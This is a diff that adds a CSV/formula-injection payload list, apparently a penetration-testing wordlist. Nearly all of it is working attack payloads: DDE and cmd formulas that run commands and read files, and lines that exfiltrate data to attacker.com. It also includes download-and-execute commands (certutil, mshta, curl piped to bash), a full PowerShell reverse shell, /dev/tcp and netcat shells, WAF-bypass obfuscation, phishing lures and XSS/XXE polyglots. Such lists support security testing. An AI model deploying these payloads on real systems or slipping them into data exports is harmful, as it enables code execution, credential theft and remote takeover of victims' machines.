@@ -1,0 +1,328 @@
+# CSV Injection Payloads (Formula Injection) - 2020-2025
+
+# ============================
+# Basic Formula Injection
+# ============================
+
+# Equals Formula
+=1+1
+=1+2+3
+=SUM(1+1)
+=2+5+cmd|' /C calc'!A0
+="string"
+=CMD|' /C powershell IEX(wget attacker.com/shell.ps1)'!A0
+
+# Plus Formula
++1+1
++cmd|'/c calc'!A1
++DDE("cmd";"/c calc";"!")
+
+# Minus Formula
+-1+1
+-cmd|'/c calc'!A1
+-DDE("cmd";"/c calc";"!")
+
+# At Symbol Formula
+@sum(1+1)
+@SUM(A1:A10)
+
+# Tab Character
+	=1+1
+	+1+1
+	-1+1
+	@sum(1+1)
+
+# Carriage Return
+=1+1
++=1+1
+
+# ============================
+# DDE (Dynamic Data Exchange) Attacks
+# ============================
+
+# Basic DDE - Command Execution
+=DDE("cmd";"/c calc";"!")
+=DDE("cmd";"/c calc.exe";"!")
+=DDE("cmd";"/c powershell";"!")
+=DDE("cmd";"/c cmd";"!")
+
+# DDE - File Reading
+=DDE("cmd";"/c type C:\Windows\System32\drivers\etc\hosts";"!")
+=DDE("cmd";"/c type C:\Users\*\Desktop\passwords.txt";"!")
+=DDE("cmd";"/c dir C:\";"!")
+
+# DDE - Information Disclosure
+=DDE("cmd";"/c whoami";"!")
+=DDE("cmd";"/c hostname";"!")
+=DDE("cmd";"/c ipconfig";"!")
+=DDE("cmd";"/c net user";"!")
+=DDE("cmd";"/c systeminfo";"!")
+
+# DDE - Data Exfiltration
+=DDE("cmd";"/c curl http://attacker.com?data=$(whoami)";"!")
+=DDE("cmd";"/c powershell -c Invoke-WebRequest -Uri http://attacker.com -Method POST -Body (Get-Content C:\passwords.txt)";"!")
+=DDE("cmd";"/c certutil -urlcache -split -f http://attacker.com/shell.exe C:\temp\shell.exe";"!")
+
+# DDE - Reverse Shell
+=DDE("cmd";"/c powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('attacker.com',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"";"!")
+
+# ============================
+# Excel HYPERLINK Function
+# ============================
+
+=HYPERLINK("http://attacker.com","Click here")
+=HYPERLINK("http://attacker.com?cookie="&A1,"Click")
+=HYPERLINK("file:///C:/Windows/System32/calc.exe","Click to update")
+=HYPERLINK(CONCATENATE("http://attacker.com/",A1),"Link")
+
+# ============================
+# IMPORTXML / WEBSERVICE Functions
+# ============================
+
+=IMPORTXML("http://attacker.com/xxe.xml","//data")
+=IMPORTXML(CONCAT("http://attacker.com?data=",A1),"//data")
+=WEBSERVICE("http://attacker.com")
+=WEBSERVICE(CONCAT("http://attacker.com?leak=",A1))
+
+# ============================
+# Obfuscation Techniques
+# ============================
+
+# Using CHAR function to hide commands
+=CHAR(61)&"DDE(""cmd"";""/c calc"";""!"")"
+=CONCATENATE(CHAR(61),"1+1")
+=CHAR(61)&CHAR(68)&CHAR(68)&CHAR(69)&"(""cmd"";""/c calc"";""!"")"
+
+# Using string concatenation
+="="&"1+1"
+=CONCATENATE("=","1+1")
+="="&"DDE(""cmd"";""/c calc"";""!"")"
+
+# Double encoding
+==1+1
+=+1+1
+=   =1+1
+
+# Null byte injection
+=1+1%00
+=DDE("cmd";"/c calc";"!")%00
+
+# Unicode characters
+＝1+1
+﹢1+1
+⁼1+1
+
+# Whitespace obfuscation
+= 1+1
+=  1+1
+=	1+1
+
+# ============================
+# Cross-Application Payloads
+# ============================
+
+# LibreOffice Calc
+=SHELL("calc")
+=SHELL("gnome-calculator")
+=SHELL("xterm -e bash")
+=SHELL("wget http://attacker.com/shell.sh -O /tmp/shell.sh && bash /tmp/shell.sh")
+
+# Google Sheets
+=IMAGE("http://attacker.com/track.png")
+=IMAGE("https://attacker.com/"&A1)
+=IMPORTDATA("http://attacker.com/data.csv")
+=IMPORTFEED("http://attacker.com/feed")
+=IMPORTHTML("http://attacker.com","table",1)
+=IMPORTRANGE("spreadsheet-id","Sheet1!A1:B10")
+
+# ============================
+# Advanced Techniques (2023-2025)
+# ============================
+
+# Chained formulas
+=IF(A1="admin",DDE("cmd";"/c calc";"!"),"safe")
+=IF(ISNUMBER(SEARCH("admin",A1)),WEBSERVICE("http://attacker.com"),"")
+
+# Nested functions
+=SUM(DDE("cmd";"/c calc";"!"))
+=CONCATENATE(DDE("cmd";"/c whoami";"!"))
+
+# Conditional execution
+=IF(1=1,DDE("cmd";"/c calc";"!"),1)
+=IFERROR(DDE("cmd";"/c calc";"!"),1)
+
+# ============================
+# Context-Aware Payloads
+# ============================
+
+# Name field
+=DDE("cmd";"/c calc";"!")
++DDE("cmd";"/c calc";"!")
+-DDE("cmd";"/c calc";"!")
+@DDE("cmd";"/c calc";"!")
+
+# Email field
+test@test.com=DDE("cmd";"/c calc";"!")
+=WEBSERVICE("http://attacker.com")@test.com
+
+# Comment field
+Great product! =DDE("cmd";"/c calc";"!")
+Review: +cmd|'/c calc'!A1
+
+# ============================
+# Payload Variations for WAF Bypass
+# ============================
+
+# Mixed case
+=dDe("cmd";"/c calc";"!")
+=DdE("cmd";"/c calc";"!")
+
+# Alternative quotes
+=DDE('cmd';'/c calc';'!')
+=DDE(`cmd`;`/c calc`;`!`)
+
+# Line breaks
+=DDE("cmd";
+"/c calc";
+"!")
+
+# Tabs and spaces
+=DDE(	"cmd"	;	"/c calc"	;	"!"	)
+
+# ============================
+# Platform-Specific Payloads
+# ============================
+
+# Windows
+=cmd|'/c calc'!A1
+=cmd|'/c powershell -c "Start-Process calc"'!A1
+=cmd|'/c mshta http://attacker.com/payload.hta'!A1
+=cmd|'/c certutil -urlcache -split -f http://attacker.com/bad.exe bad.exe && bad.exe'!A1
+=cmd|'/c wmic process call create "calc.exe"'!A1
+=cmd|'/c reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall'!A1
+
+# Linux/Unix
+=SHELL("calc")
+=SHELL("xcalc")
+=SHELL("xterm")
+=SHELL("/bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1")
+=SHELL("curl http://attacker.com/shell.sh | bash")
+=SHELL("nc attacker.com 4444 -e /bin/sh")
+
+# macOS
+=SHELL("open /Applications/Calculator.app")
+=SHELL("osascript -e 'tell application \"Calculator\" to activate'")
+=SHELL("curl http://attacker.com/payload.sh | sh")
+
+# ============================
+# Data Exfiltration Payloads
+# ============================
+
+# Exfiltrate cell data
+=WEBSERVICE("http://attacker.com?data="&A1)
+=HYPERLINK("http://attacker.com?token="&B2,"Update")
+=IMAGE("http://attacker.com/track.gif?user="&C3)
+
+# Exfiltrate multiple cells
+=WEBSERVICE("http://attacker.com?u="&A1&"&p="&B1)
+=CONCATENATE("http://attacker.com/",A1,"/",B1,"/",C1)
+
+# ============================
+# Denial of Service
+# ============================
+
+# Resource exhaustion
+=SUM(1:1048576)
+=IF(A1<>"",$A$1:$XFD$1048576,"")
+=VLOOKUP(A1,$A$1:$XFD$1048576,1,FALSE)
+
+# Circular references
+=A1
+(in cell A1 itself, causes circular reference)
+
+# ============================
+# Remote File Inclusion
+# ============================
+
+=IMPORTXML("http://attacker.com/xxe.xml","//data")
+=IMPORTHTML("http://attacker.com/malicious.html","table",1)
+=IMPORTFEED("http://attacker.com/rss")
+=IMPORTDATA("http://attacker.com/data.txt")
+
+# ============================
+# XXE via CSV (when parsed as XML internally)
+# ============================
+
+=IMPORTXML("data:text/xml,<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>","//foo")
+
+# ============================
+# Social Engineering Payloads
+# ============================
+
+Please verify your account: =HYPERLINK("http://phishing.com","Click Here")
+Congratulations! You won: =DDE("cmd";"/c calc";"!")
+URGENT - Security Update Required =cmd|'/c powershell iex(wget attacker.com/malware.ps1)'!A1
+Invoice #12345 =WEBSERVICE("http://attacker.com/log")
+
+# ============================
+# Polyglot Payloads
+# ============================
+
+=1+1';alert(document.domain)//
+=DDE("cmd";"/c calc";"!")||'<script>alert(1)</script>
++cmd|'/c calc'!A1'"><img src=x onerror=alert(1)>
+
+# ============================
+# Null Cell Reference
+# ============================
+
+=A0
+=DDE("cmd";"/c calc";"!")!A0
+=cmd|'/c powershell'!A0
+
+# ============================
+# Format Confusion
+# ============================
+
+"=1+1"
+'=1+1
+`=1+1
+´=1+1
+
+# ============================
+# Batch CSV Injection (Multiple Rows)
+# ============================
+
+# First row normal, second row malicious
+Normal User,user@email.com,Regular Comment
+Hacker,=DDE("cmd";"/c calc";"!"),Malicious
+
+# ============================
+# CSV Injection in Different Contexts
+# ============================
+
+# In URL parameters
+?name==DDE("cmd";"/c calc";"!")
+?search=+cmd|'/c calc'!A1
+
+# In JSON (if converted to CSV)
+{"name": "=DDE(\"cmd\";\"/c calc\";\"!\")"}
+
+# In XML (if converted to CSV)
+<name>=cmd|'/c calc'!A1</name>
+
+# ============================
+# Time-Delayed Payloads
+# ============================
+
+=IF(NOW()>DATE(2024,1,1),DDE("cmd";"/c calc";"!"),1)
+=IF(TODAY()=WEEKDAY(1),WEBSERVICE("http://attacker.com"),1)
+
+# ============================
+# Modern Framework Specific (2024-2025)
+# ============================
+
+# When exported from web applications
+=WEBSERVICE(CONCAT("http://attacker.com/?cookie=",CELL("filename")))
+=HYPERLINK("javascript:alert(document.cookie)","click")
+=@SUM(A1:A1000)*WEBSERVICE("http://attacker.com")
